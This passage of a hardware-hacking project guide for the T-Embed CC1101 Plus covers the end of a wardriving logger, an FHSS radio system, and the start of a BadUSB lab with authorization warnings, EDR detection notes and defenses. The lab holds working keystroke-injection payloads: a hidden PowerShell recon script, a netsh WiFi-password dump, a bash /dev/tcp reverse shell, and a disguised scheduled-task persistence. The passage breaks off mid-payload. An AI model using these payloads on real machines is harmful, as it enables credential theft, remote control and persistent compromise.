                int32_t ch, int32_t rssi) {
    if (!logFile) return;
    ssid.replace(",", ".");

    char ts[32];
    snprintf(ts, sizeof(ts),
             "%04d-%02d-%02d %02d:%02d:%02d",
             gps.date.year(), gps.date.month(),
             gps.date.day(),  gps.time.hour(),
             gps.time.minute(), gps.time.second());

    logFile.printf(
        "%s,%s,%s,%s,%d,%d,%.6f,%.6f,%.1f,%.1f,WIFI\n",
        bssid.c_str(), ssid.c_str(),
        authModeStr(auth).c_str(), ts,
        ch, rssi,
        gps.location.lat(), gps.location.lng(),
        gps.altitude.meters(), gps.hdop.hdop());
    logFile.flush();
}

void createLogFile() {
    char fn[32];
    snprintf(fn, sizeof(fn), "/wardrive_%03lu.csv",
             (unsigned long)(millis() / 1000));
    logFileName = String(fn);
    logFile = SD.open(logFileName, FILE_WRITE);
    if (logFile) {
        logFile.println(WIGLE_HEADER);
        logFile.flush();
    } else {
        sdReady = false;
    }
}

void updateDashboard() {
    tft.fillScreen(TFT_BLACK);

    // Title bar
    tft.fillRect(0, 0, 320, 20, TFT_NAVY);
    tft.setTextColor(TFT_WHITE, TFT_NAVY);
    tft.drawString("WARDRIVING", 5, 3, 2);
    tft.setTextColor(sdReady ? TFT_GREEN : TFT_RED,
                     TFT_NAVY);
    tft.drawString(sdReady ? "SD:OK" : "SD:ERR",
                   200, 3, 2);
    tft.setTextColor(gpsFixed ? TFT_GREEN : TFT_YELLOW,
                     TFT_NAVY);
    tft.drawString(gpsFixed ? "GPS:FIX" : "GPS:---",
                   260, 3, 2);

    // Network counts
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Unique APs:", 10, 30, 2);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(String(totalUnique), 130, 30, 2);

    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Total Seen:", 10, 50, 2);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(String(totalNetworks), 130, 50, 2);

    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Scans:", 10, 70, 2);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(String(scanCount), 130, 70, 2);

    // GPS section
    tft.drawLine(0, 93, 320, 93, TFT_DARKGREY);

    if (gpsFixed) {
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.drawString("Lat:", 10, 100, 2);
        tft.drawString(String(gps.location.lat(), 6),
                       50, 100, 2);
        tft.drawString("Lon:", 170, 100, 2);
        tft.drawString(String(gps.location.lng(), 6),
                       210, 100, 2);
        tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
        tft.drawString("Alt:", 10, 120, 2);
        tft.drawString(
            String(gps.altitude.meters(), 1) + "m",
            50, 120, 2);
        tft.drawString("Spd:", 170, 120, 2);
        tft.drawString(
            String(gps.speed.kmph(), 1) + "km/h",
            210, 120, 2);
        tft.drawString("Sats:", 10, 140, 2);
        tft.drawString(
            String(gps.satellites.value()),
            60, 140, 2);
    } else {
        tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.drawString("Waiting for GPS fix...",
                        10, 100, 2);
        tft.drawString(
            "Sats: " + String(gps.satellites.value()),
            10, 120, 2);
    }

    // Status bar
    tft.fillRect(0, 158, 320, 12, TFT_DARKGREY);
    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
    if (sdReady && gpsFixed)
        tft.drawString("LOGGING - " + logFileName,
                        5, 159, 1);
    else if (!gpsFixed)
        tft.drawString("NO GPS FIX - NOT LOGGING",
                        5, 159, 1);
    else
        tft.drawString("SD ERROR - NOT LOGGING",
                        5, 159, 1);
}
```

**Step 5 --- Flash and Acquire Initial GPS Fix**

1. Connect the T-Embed to your computer via USB
2. Open Arduino IDE, select board **ESP32S3 Dev Module**
3. Set USB Mode to "USB-OTG (TinyUSB)" and USB CDC On Boot to "Enabled"
4. Compile and upload the firmware
5. Disconnect USB and power via battery
6. Take the device outside with a clear sky view
7. Wait for the GPS LED to begin blinking at 1 Hz (indicating a fix acquired)
8. The TFT dashboard should change from "Waiting for GPS fix..." to showing live coordinates

{: .tip }
> The first GPS fix can take up to 2 minutes on cold start. Once fixed, the module saves satellite almanac data and subsequent fixes are much faster (5--15 seconds). Keep the antenna facing upward and away from metal objects.

**Step 6 --- Conduct Your Wardrive**

Mount or hold the T-Embed so the GPS antenna has a clear sky view. Drive or walk through your neighborhood at moderate speed. The device will:

1. Scan for WiFi networks every 3 seconds
2. Stamp each discovered network with GPS coordinates
3. Log everything to the SD card in WiGLE CSV format
4. Display live statistics on the TFT

Expected dashboard during active scanning:

```
+------------------------------------------+
| WARDRIVING              SD:OK  GPS:FIX   |
|------------------------------------------|
| Unique APs:    347                       |
| Total Seen:   1204                       |
| Scans:          89                       |
|------------------------------------------|
| Lat: 34.052235    Lon: -118.243683       |
| Alt: 89.2m        Spd: 24.3 km/h        |
| Sats: 9                                 |
|------------------------------------------|
| LOGGING - /wardrive_001.csv              |
+------------------------------------------+
```

Recommended routes for best results:

- Drive through residential streets (dense AP population)
- Pass by commercial areas (many business networks)
- Cover both main roads and side streets for complete coverage
- Drive at 25--50 km/h for optimal scanning density
- A 30-minute drive typically discovers 500--2000+ unique networks

**Step 7 --- Analyze Your Data**

Remove the SD card and open the CSV file on your computer. The file contains rows like:

```csv
MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type
AA:BB:CC:DD:EE:FF,HomeNetwork,[WPA2-PSK],2026-03-01 14:30:15,6,-67,34.052235,-118.243683,89.2,1.2,WIFI
11:22:33:44:55:66,CoffeeShop,[OPEN],2026-03-01 14:31:02,1,-82,34.053012,-118.244501,91.0,1.5,WIFI
```

You can analyze this data with:

- **Python + Pandas**: Load the CSV and compute statistics --- encryption breakdown, channel distribution, signal strength histogram
- **Google Earth / QGIS**: Plot each network on a map using the lat/lon coordinates
- **WiGLE.net**: Upload your data to the global wardriving database (Step 8)

**Step 8 --- Upload to WiGLE.net (Optional)**

WiGLE (Wireless Geographic Logging Engine) is a community database of wireless networks mapped by volunteers worldwide:

1. Create a free account at [wigle.net](https://wigle.net)
2. Navigate to **Uploads** in your account dashboard
3. Upload your CSV file (our format is already WiGLE-compatible)
4. Your networks will appear on the global map within a few hours
5. You earn points and rankings based on unique networks discovered

{: .note }
> WiGLE only records the presence and location of access points --- it does not involve connecting to or testing any network. Contributing to WiGLE helps security researchers understand the global state of wireless security.

**Step 9 --- Wardriving Legality Discussion**

Wardriving legality depends on your jurisdiction. Key principles:

| Activity | Generally Legal? | Notes |
|:---------|:----------------|:------|
| Passively receiving WiFi beacons | Yes (most jurisdictions) | Beacons are broadcast publicly |
| Logging SSID, BSSID, channel, encryption | Yes | Publicly broadcast metadata |
| Logging GPS coordinates with network data | Yes | Your own position data |
| Connecting to discovered networks | **No** (without auth) | Unauthorized access |
| Cracking passwords of discovered networks | **No** | Unauthorized access attempt |
| Deauthenticating clients on networks | **No** | Active interference |

{: .warning }
> While passive wardriving is generally legal, some jurisdictions may have specific laws about recording wireless network locations. Research your local laws before conducting wardrive surveys. Never attempt to connect to, interfere with, or exploit any network you discover. Passive observation only.

### Expected Results

- A 30-minute drive through a suburban neighborhood will typically yield 500--2000 unique access points
- Urban areas can produce 5000+ networks per hour of driving
- WPA2 will be the dominant encryption type (70--85% of networks in most areas)
- A small percentage of networks (1--5%) will still use WEP or remain completely open
- Channels 1, 6, and 11 will have the highest network density (the non-overlapping 2.4 GHz channels)
- Hidden networks (empty SSID) typically make up 5--15% of discovered access points
- GPS accuracy (HDOP) will vary: excellent in open areas (< 1.0), degraded near tall buildings (> 3.0)
- Your CSV file will grow at approximately 50--100 KB per hour of scanning

### Extensions

- Add BLE scanning alongside WiFi to create a combined wireless survey logging BLE devices with GPS coordinates too
- Build a heatmap visualization showing network density by geographic area using Python and Folium
- Add real-time channel utilization graphing on the TFT as a bar chart showing networks per channel
- Implement duplicate detection optimization using a hash set instead of linear array search for better performance with large datasets
- Add a "new network" alert with an audible beep or TFT flash when a previously unseen BSSID is discovered
- Compare encryption statistics across different neighborhoods: residential vs. commercial vs. industrial

---
---

## Project 22: Frequency-Hopping Spread Spectrum (FHSS) Communication System
{: .d-inline-block }

Expert
{: .label .label-red }

### Overview

Frequency-Hopping Spread Spectrum is one of the most important innovations in radio communication history. Patented in 1942 by actress Hedy Lamarr and composer George Antheil as a method to prevent the jamming of radio-controlled torpedoes, FHSS works by rapidly switching the carrier frequency among many discrete channels in a sequence known to both transmitter and receiver. To an observer without the hopping sequence, the signal appears as brief, random noise bursts scattered across the spectrum.

This project builds a working FHSS communication system between two T-Embed CC1101 Plus devices. You will implement a pseudo-random hopping sequence across 25 channels in the 433 MHz ISM band, synchronize the transmitter and receiver, and send text messages that hop frequencies every 50 milliseconds. The CC1101's frequency synthesizer can retune in under 90 microseconds, making it ideal for demonstrating FHSS principles.

You will see firsthand why FHSS is resistant to both interception and jamming. A narrowband receiver monitoring any single channel will only see brief, unintelligible fragments. A jammer targeting one frequency will only disrupt a tiny fraction of the communication. Modern WiFi, Bluetooth, military radios, and cordless phones all use variations of this technique.

### What You'll Learn

- The theory and history of frequency-hopping spread spectrum
- Pseudo-random number generation for hopping sequence creation
- CC1101 frequency synthesizer programming and fast retuning
- Time synchronization between independent embedded devices
- Packet structure design for hopped communication
- Why FHSS provides resistance to interception and jamming
- Dwell time, hop rate, and their relationship to data throughput
- Synchronization acquisition and recovery algorithms

### Materials Needed

- Two T-Embed CC1101 Plus devices (one transmitter, one receiver)
- Matching antennas tuned for 433 MHz on both devices
- PlatformIO or Arduino IDE with ESP32-S3 board support
- Computer for firmware development and flashing
- (Optional) RTL-SDR with SDR# or GQRX to visualize the hopping
- (Optional) Oscilloscope or logic analyzer for timing verification

### Step-by-Step Instructions

**Step 1 --- Design the Hopping Table**

Define 25 channels spread across the 433 MHz ISM band (433.05--434.79 MHz). Space channels at least 50 kHz apart to avoid adjacent-channel interference:

```c
// 25 hop channels across 433 MHz ISM band
// Each channel separated by ~70 kHz
const float hop_channels[25] = {
    433.075, 433.150, 433.225, 433.300, 433.375,
    433.450, 433.525, 433.600, 433.675, 433.750,
    433.825, 433.900, 433.975, 434.050, 434.125,
    434.200, 434.275, 434.350, 434.425, 434.500,
    434.575, 434.650, 434.725, 434.800, 434.875
};

#define NUM_CHANNELS    25
#define DWELL_TIME_MS   50    // Time spent on each channel
#define HOP_RATE        20    // Hops per second (1000 / DWELL_TIME_MS)
#define SYNC_CHANNEL    12    // Channel index used for synchronization
#define SHARED_SEED     0x5A3C// Shared PRNG seed (both devices must match)
```

**Step 2 --- Implement the Pseudo-Random Hopping Sequence**

Use a Linear Feedback Shift Register (LFSR) to generate the hopping sequence. Both transmitter and receiver use the same seed, so they produce the same sequence:

```c
// 16-bit LFSR for pseudo-random hopping sequence
// Polynomial: x^16 + x^14 + x^13 + x^11 + 1
// Period: 65535 (visits all non-zero states)

uint16_t lfsr_state = SHARED_SEED;

uint16_t lfsr_next() {
    uint16_t bit = ((lfsr_state >> 0) ^
                    (lfsr_state >> 2) ^
                    (lfsr_state >> 3) ^
                    (lfsr_state >> 5)) & 1;
    lfsr_state = (lfsr_state >> 1) | (bit << 15);
    return lfsr_state;
}

// Get next channel index from LFSR
uint8_t getNextChannel() {
    return lfsr_next() % NUM_CHANNELS;
}

// Reset LFSR to known state for synchronization
void resetHopSequence() {
    lfsr_state = SHARED_SEED;
}
```

**Step 3 --- Build the Packet Structure**

Each hop carries a small packet. Include a sequence number so the receiver can detect missed hops and resynchronize:

```c
typedef struct __attribute__((packed)) {
    uint8_t  preamble;       // 0xAA - marks valid FHSS packet
    uint16_t hop_counter;    // Current position in hop sequence
    uint8_t  fragment_id;    // Message fragment number
    uint8_t  fragment_total; // Total fragments in this message
    uint8_t  payload_len;    // Length of payload data
    uint8_t  payload[24];    // Message fragment (max 24 bytes per hop)
    uint16_t crc;            // CRC-16 for error detection
} FHSSPacket;

#define PACKET_PREAMBLE  0xAA
#define MAX_PAYLOAD      24
```

**Step 4 --- Implement the Transmitter**

```c
#include <SPI.h>
// Include your CC1101 library of choice

uint16_t hop_counter = 0;

void setup() {
    Serial.begin(115200);
    initCC1101();
    initDisplay();
    resetHopSequence();

    displayMessage("FHSS TX Ready");
    displayMessage("Enter message via Serial");
}

void loop() {
    // Check for message input via Serial
    if (Serial.available()) {
        String message = Serial.readStringUntil('\n');
        sendFHSSMessage(message.c_str(), message.length());
    }
}

void sendFHSSMessage(const char* msg, uint16_t len) {
    // Calculate number of fragments needed
    uint8_t total_fragments = (len + MAX_PAYLOAD - 1) / MAX_PAYLOAD;
    uint16_t offset = 0;

    displayMessage("Transmitting...");

    for (uint8_t frag = 0; frag < total_fragments; frag++) {
        // Build packet
        FHSSPacket pkt;
        pkt.preamble = PACKET_PREAMBLE;
        pkt.hop_counter = hop_counter;
        pkt.fragment_id = frag;
        pkt.fragment_total = total_fragments;

        uint8_t chunk = min((uint16_t)MAX_PAYLOAD, len - offset);
        pkt.payload_len = chunk;
        memcpy(pkt.payload, msg + offset, chunk);
        offset += chunk;

        pkt.crc = crc16((uint8_t*)&pkt, sizeof(pkt) - 2);

        // Hop to next channel
        uint8_t ch = getNextChannel();
        setCC1101Frequency(hop_channels[ch]);

        // Wait for synthesizer to settle (~90 us on CC1101)
        delayMicroseconds(150);

        // Transmit packet
        cc1101_sendPacket((uint8_t*)&pkt, sizeof(pkt));

        // Display hop info
        char info[64];
        snprintf(info, sizeof(info), "Hop %d -> Ch %d (%.3f MHz)",
            hop_counter, ch, hop_channels[ch]);
        displayHopInfo(info);

        hop_counter++;
        delay(DWELL_TIME_MS);  // Dwell on this channel
    }

    displayMessage("Message sent!");
}
```

**Step 5 --- Implement the Receiver**

The receiver must track the same hopping sequence and listen on the correct channel at the correct time:

```c
uint16_t rx_hop_counter = 0;
char message_buffer[256];
uint16_t buffer_offset = 0;
uint8_t expected_fragments = 0;
uint8_t received_fragments = 0;
bool synchronized = false;

void setup() {
    Serial.begin(115200);
    initCC1101();
    initDisplay();
    resetHopSequence();

    displayMessage("FHSS RX Ready");
    displayMessage("Synchronizing...");

    // Start by acquiring synchronization
    acquireSync();
}

void loop() {
    if (!synchronized) {
        acquireSync();
        return;
    }

    // Hop to next expected channel
    uint8_t ch = getNextChannel();
    setCC1101Frequency(hop_channels[ch]);
    delayMicroseconds(150);

    // Listen for a packet during dwell time
    unsigned long start = millis();
    bool received = false;

    while (millis() - start < DWELL_TIME_MS) {
        if (cc1101_packetAvailable()) {
            FHSSPacket pkt;
            cc1101_readPacket((uint8_t*)&pkt, sizeof(pkt));

            // Validate packet
            if (pkt.preamble != PACKET_PREAMBLE) continue;

            uint16_t calc_crc = crc16((uint8_t*)&pkt, sizeof(pkt) - 2);
            if (calc_crc != pkt.crc) {
                displayMessage("CRC error on hop");
                continue;
            }

            // Check synchronization
            if (pkt.hop_counter != rx_hop_counter) {
                displayMessage("Sync drift detected!");
                resynchronize(pkt.hop_counter);
            }

            // Reassemble message
            if (pkt.fragment_id == 0) {
                buffer_offset = 0;
                expected_fragments = pkt.fragment_total;
                received_fragments = 0;
            }

            memcpy(message_buffer + (pkt.fragment_id * MAX_PAYLOAD),
                   pkt.payload, pkt.payload_len);
            received_fragments++;

            if (received_fragments == expected_fragments) {
                message_buffer[buffer_offset + pkt.payload_len] = '\0';
                displayReceivedMessage(message_buffer);
                Serial.printf("Received: %s\n", message_buffer);
            }

            received = true;
            break;
        }
    }

    if (!received) {
        // Missed hop --- track consecutive misses for resync
        consecutive_misses++;
        if (consecutive_misses > 10) {
            synchronized = false;
            displayMessage("Lost sync! Reacquiring...");
        }
    } else {
        consecutive_misses = 0;
    }

    rx_hop_counter++;
}
```

**Step 6 --- Implement Synchronization Acquisition**

The most critical part of any FHSS system is initial synchronization. The receiver must find the transmitter and lock onto its hopping sequence:

```c
void acquireSync() {
    displayMessage("Listening on sync channel...");

    // Strategy: Listen on a fixed "sync channel" for a beacon
    // The transmitter sends sync beacons periodically on this channel
    setCC1101Frequency(hop_channels[SYNC_CHANNEL]);

    unsigned long timeout = millis() + 10000;  // 10 second timeout

    while (millis() < timeout) {
        if (cc1101_packetAvailable()) {
            FHSSPacket pkt;
            cc1101_readPacket((uint8_t*)&pkt, sizeof(pkt));

            if (pkt.preamble == PACKET_PREAMBLE) {
                // Extract the hop counter from the sync beacon
                rx_hop_counter = pkt.hop_counter;

                // Reset LFSR and advance to match transmitter position
                resetHopSequence();
                for (uint16_t i = 0; i < rx_hop_counter; i++) {
                    getNextChannel();  // Advance LFSR to match
                }

                synchronized = true;
                consecutive_misses = 0;
                displayMessage("SYNCHRONIZED!");
                delay(500);
                return;
            }
        }
    }

    displayMessage("Sync timeout - retrying");
}

// Transmitter sends sync beacons every 50 hops
void sendSyncBeacon() {
    if (hop_counter % 50 == 0) {
        float saved_freq = getCurrentFrequency();

        setCC1101Frequency(hop_channels[SYNC_CHANNEL]);
        delayMicroseconds(150);

        FHSSPacket sync_pkt;
        sync_pkt.preamble = PACKET_PREAMBLE;
        sync_pkt.hop_counter = hop_counter;
        sync_pkt.fragment_id = 0xFF;     // Marks as sync beacon
        sync_pkt.fragment_total = 0xFF;
        sync_pkt.payload_len = 0;
        sync_pkt.crc = crc16((uint8_t*)&sync_pkt, sizeof(sync_pkt) - 2);

        cc1101_sendPacket((uint8_t*)&sync_pkt, sizeof(sync_pkt));

        setCC1101Frequency(saved_freq);  // Return to hop sequence
        delayMicroseconds(150);
    }
}
```

**Step 7 --- Verify with a Spectrum Analyzer**

If you have an RTL-SDR, open SDR# or GQRX and set it to a wide view covering 433--435 MHz. When the FHSS system is running, you should see:

- Brief signal bursts appearing at seemingly random frequencies
- Each burst lasting approximately 50 ms (the dwell time)
- No sustained signal on any single frequency
- The pattern appearing indistinguishable from random noise to a casual observer

Compare this to a fixed-frequency transmission, which appears as a continuous signal on one channel. The difference demonstrates why FHSS is difficult to intercept.

**Step 8 --- Timing Analysis**

Measure the actual timing of your system and verify the synchronization holds:

```c
// Add timing instrumentation
void measureHopTiming() {
    unsigned long hop_times[100];

    for (int i = 0; i < 100; i++) {
        unsigned long start = micros();

        uint8_t ch = getNextChannel();
        setCC1101Frequency(hop_channels[ch]);
        delayMicroseconds(150);

        hop_times[i] = micros() - start;
    }

    // Calculate statistics
    unsigned long total = 0, min_t = ULONG_MAX, max_t = 0;
    for (int i = 0; i < 100; i++) {
        total += hop_times[i];
        if (hop_times[i] < min_t) min_t = hop_times[i];
        if (hop_times[i] > max_t) max_t = hop_times[i];
    }

    Serial.printf("Hop timing (100 samples):\n");
    Serial.printf("  Average: %lu us\n", total / 100);
    Serial.printf("  Min: %lu us\n", min_t);
    Serial.printf("  Max: %lu us\n", max_t);
    Serial.printf("  Jitter: %lu us\n", max_t - min_t);
}
```

### Expected Results

- Successful text message delivery across 25 hopping channels with error rates below 5% at close range (under 10 meters indoors)
- CC1101 frequency retune times of 80--120 microseconds, well within the 50 ms dwell window
- Synchronization acquisition within 2--5 seconds when both devices are powered on
- On a spectrum analyzer, the transmission will appear as brief random noise bursts scattered across the band
- A narrowband receiver tuned to any single channel will capture only 1 out of every 25 hops --- unintelligible fragments
- If you intentionally jam one channel, communication continues with only a 4% packet loss rate
- Synchronization will hold for thousands of hops before drift requires re-acquisition

{: .tip }
> To make the FHSS demonstration more visual, add a frequency indicator on the TFT that shows a bar chart of all 25 channels, highlighting the current active channel. This makes the hopping pattern visually obvious and is excellent for presentations or teaching.

### Extensions

- Increase the hopping rate to 100 or 200 hops per second for more robust anti-jam performance
- Implement adaptive hopping that avoids channels with detected interference
- Add AES-128 encryption to the payload for confidentiality in addition to anti-intercept
- Build a chat application where both devices can transmit and receive (time-division duplex)
- Implement error correction coding (Hamming or Reed-Solomon) to recover from missed hops
- Experiment with different LFSR polynomials and seed exchange protocols
- Add a "hopping sequence negotiation" where devices agree on a new seed periodically

---

## Project 23: BadUSB Payload Development Lab
{: .d-inline-block }

Advanced
{: .label .label-purple }

### Overview

The T-Embed CC1101 Plus, powered by the ESP32-S3, has native USB OTG support that allows it to enumerate as a USB Human Interface Device --- specifically, a keyboard. When plugged into a computer, the operating system trusts it implicitly. There is no driver prompt, no security warning, no confirmation dialog. It simply starts accepting "keystrokes" as if a human were typing them. This is the foundation of every BadUSB attack.

This project builds a comprehensive payload development and testing environment. You will create five distinct payloads targeting different operating systems and attack scenarios, implement a menu-driven payload selector on the T-Embed's TFT display, and --- critically --- analyze each payload from a defensive perspective. For every attack you build, you will document exactly how an Endpoint Detection and Response (EDR) system would detect it, and what defensive countermeasures exist.

This is a controlled, educational exercise. Every payload is designed to run on machines you own, in a lab environment you control. The goal is to understand the attack surface so you can defend against it.

{: .danger }
> **Use ONLY on machines you own or have explicit written authorization to test.** Deploying BadUSB payloads on unauthorized systems is a federal crime under the Computer Fraud and Abuse Act (18 U.S.C. SS 1030) and equivalent laws worldwide. No exceptions. No excuses.

### What You'll Learn

- USB HID enumeration and how operating systems handle keyboard devices
- Ducky Script syntax and payload development methodology
- Operating system command-line interfaces (PowerShell, Terminal, bash)
- Attack chain construction: reconnaissance, execution, exfiltration
- EDR detection signatures and behavioral analysis
- Defensive countermeasures for USB-based attacks
- Testing methodology and controlled lab environment setup

### Materials Needed

- T-Embed CC1101 Plus with USB-C cable
- Test machines you own: Windows 10/11 PC, macOS system, Linux system (at least one)
- Isolated test network (not your production network)
- A second computer or VM running Kali Linux (for reverse shell testing)
- MicroSD card for payload storage
- Text editor for Ducky Script development

{: .warning }
> Set up an isolated test lab. Use virtual machines or dedicated test hardware on an air-gapped network segment. Never test BadUSB payloads on machines connected to production networks or containing real sensitive data.

### Step-by-Step Instructions

**Step 1 --- Set Up the Payload Selector Menu**

Build a menu on the T-Embed that lets you select which payload to deploy before plugging into the target:

```c
#include <USB.h>
#include <USBHIDKeyboard.h>
#include <TFT_eSPI.h>

USBHIDKeyboard Keyboard;
TFT_eSPI tft = TFT_eSPI();

typedef struct {
    const char* name;
    const char* os;
    const char* description;
    void (*execute)(void);
} Payload;

Payload payloads[] = {
    {"SysInfo Grab",    "Windows", "Hostname, IP, users, OS",  payload_sysinfo_win},
    {"WiFi Passwords",  "Windows", "Extract saved WiFi creds", payload_wifi_win},
    {"Reverse Shell",   "Linux",   "Connect back to Kali",     payload_revshell_linux},
    {"Persistence",     "Windows", "Scheduled task install",    payload_persist_win},
    {"Exfil Demo",      "macOS",   "Copy test file to /tmp",   payload_exfil_mac},
};

#define NUM_PAYLOADS (sizeof(payloads) / sizeof(Payload))

uint8_t selected_payload = 0;
bool armed = false;

void displayPayloadMenu() {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(0, 0);
    tft.println("=== BADUSB LAB ===");
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.println("YOUR DEVICES ONLY\n");

    for (int i = 0; i < NUM_PAYLOADS; i++) {
        if (i == selected_payload) {
            tft.setTextColor(TFT_GREEN, TFT_BLACK);
            tft.printf("> ");
        } else {
            tft.setTextColor(TFT_WHITE, TFT_BLACK);
            tft.printf("  ");
        }
        tft.printf("%s [%s]\n", payloads[i].name, payloads[i].os);
    }

    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.printf("\n[ROTATE] Select  [PRESS] Arm");
    if (armed) {
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.printf("\n\nARMED: Plug into YOUR target");
    }
}
```

**Step 2 --- Helper Functions for Keystroke Injection**

```c
// Type a string with realistic inter-key delay
void typeString(const char* str, uint16_t delay_ms = 5) {
    for (int i = 0; str[i] != '\0'; i++) {
        Keyboard.print(str[i]);
        delay(delay_ms);
    }
}

// Press a key combination (e.g., GUI+R for Run dialog)
void hotkey(uint8_t modifier, uint8_t key) {
    Keyboard.press(modifier);
    Keyboard.press(key);
    delay(50);
    Keyboard.releaseAll();
    delay(100);
}

// Open Windows Run dialog
void openRunDialog() {
    hotkey(KEY_LEFT_GUI, 'r');
    delay(500);  // Wait for dialog to appear
}

// Open macOS Spotlight
void openSpotlight() {
    hotkey(KEY_LEFT_GUI, ' ');
    delay(500);
}

// Open Linux terminal (common shortcut)
void openLinuxTerminal() {
    hotkey(KEY_LEFT_CTRL | KEY_LEFT_ALT, 't');
    delay(800);
}
```

**Step 3 --- Payload 1: System Information Grabber (Windows)**

This payload opens PowerShell and collects system information, saving it to a file on the desktop:

```c
void payload_sysinfo_win() {
    delay(1000);  // Wait for USB enumeration

    // Open PowerShell via Run dialog
    openRunDialog();
    typeString("powershell -WindowStyle Hidden");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1500);

    // Collect system information and save to desktop
    typeString(
        "$out = \"$env:USERPROFILE\\Desktop\\sysinfo.txt\"; "
        "\"=== System Info ===\"  | Out-File $out; "
        "\"Hostname: $env:COMPUTERNAME\" | Out-File $out -Append; "
        "\"Username: $env:USERNAME\" | Out-File $out -Append; "
        "\"Domain: $env:USERDOMAIN\" | Out-File $out -Append; "
        "\"OS: $((Get-CimInstance Win32_OperatingSystem).Caption)\" "
        "  | Out-File $out -Append; "
        "\"IP Addresses:\" | Out-File $out -Append; "
        "Get-NetIPAddress -AddressFamily IPv4 "
        "  | Select IPAddress,InterfaceAlias "
        "  | Out-File $out -Append; "
        "\"Local Users:\" | Out-File $out -Append; "
        "Get-LocalUser | Select Name,Enabled "
        "  | Out-File $out -Append; "
        "exit"
    );
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
}
```

**Ducky Script equivalent:**

```
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1500
STRING $out = "$env:USERPROFILE\Desktop\sysinfo.txt"; "=== System Info ===" | Out-File $out; "Hostname: $env:COMPUTERNAME" | Out-File $out -Append; "Username: $env:USERNAME" | Out-File $out -Append; Get-NetIPAddress -AddressFamily IPv4 | Select IPAddress | Out-File $out -Append; Get-LocalUser | Select Name,Enabled | Out-File $out -Append; exit
ENTER
```

**EDR detection profile:** Spawning `powershell.exe` from a HID device with `-WindowStyle Hidden` is a high-confidence indicator of compromise. Any modern EDR (CrowdStrike, SentinelOne, Defender for Endpoint) will flag this within seconds. The command-line arguments are logged in Windows Event ID 4688 (Process Creation).

**Defense:** Enable PowerShell Constrained Language Mode. Use AppLocker to restrict PowerShell execution. Monitor Event ID 4688 for suspicious command-line patterns.

**Step 4 --- Payload 2: WiFi Password Extractor (Windows)**

```c
void payload_wifi_win() {
    delay(1000);

    openRunDialog();
    typeString("cmd /k");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1000);

    // Export all saved WiFi profiles with passwords
    typeString(
        "for /f \"tokens=2 delims=:\" %a in "
        "('netsh wlan show profiles ^| findstr Profile') "
        "do @netsh wlan show profile name=\"%~a\" key=clear "
        ">> %USERPROFILE%\\Desktop\\wifi_passwords.txt"
    );
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(5000);

    typeString("exit");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
}
```

**EDR detection profile:** The `netsh wlan show profile key=clear` command is a well-known credential harvesting technique. EDR tools maintain signatures for this exact command string. Additionally, iterating over all WiFi profiles in a batch loop is behavioral evidence of automated credential theft.

**Defense:** Restrict `netsh` execution via AppLocker. Use 802.1X enterprise authentication instead of PSK (passwords are not stored locally). Monitor for bulk `netsh wlan` queries.

**Step 5 --- Payload 3: Reverse Shell (Linux)**

This payload opens a terminal and connects back to your Kali machine. Set up a listener on Kali first with `nc -lvnp 4444`:

```c
void payload_revshell_linux() {
    delay(1000);

    openLinuxTerminal();
    delay(1000);

    // Bash reverse shell to YOUR Kali machine
    // Replace 192.168.1.100 with your Kali IP
    typeString(
        "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &"
    );
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);

    // Close the visible terminal
    typeString("exit");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
}
```

**EDR detection profile:** Outbound TCP connections initiated by `bash` to non-standard ports are flagged by network-aware EDRs. The `/dev/tcp` redirection pattern is a known reverse shell signature. Tools like Falco and OSSEC detect this on Linux systems.

**Defense:** Use firewall rules to block outbound connections on non-standard ports. Deploy Linux EDR agents (CrowdStrike Falcon for Linux, SentinelOne). Monitor `/dev/tcp` usage in audit logs.

**Step 6 --- Payload 4: Persistence Installer (Windows)**

```c
void payload_persist_win() {
    delay(1000);

    openRunDialog();
    typeString("powershell -WindowStyle Hidden");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1500);

    // Create a scheduled task that runs at login
    // This example runs a harmless marker file for testing
    typeString(
        "schtasks /create /tn \"WindowsUpdateCheck\" "
        "/tr \"powershell -Command "
        "  New-Item -Path $env:TEMP\\persistence_test.txt "
        "  -Value (Get-Date) -Force\" "
        "/sc onlogon /rl highest /f; "
        "exit"
    );
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
}
```

**EDR detection profile:** Creation of scheduled tasks via `schtasks.exe` from a PowerShell process spawned by a HID device is a classic persistence technique. EDR tools monitor the Windows Task Scheduler event log (Event IDs 106, 140, 141) and flag tasks created with `/rl highest` (elevated privileges).

**Defense:** Restrict `schtasks.exe` via AppLocker. Monitor Task Scheduler event logs. Use Group Policy to limit who can create scheduled tasks. Regular audit of scheduled tasks across all endpoints.

**Step 7 --- Payload 5: File Exfiltration Demo (macOS)**

```c
void payload_exfil_mac() {
    delay(1000);

    openSpotlight();
    typeString("Terminal");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
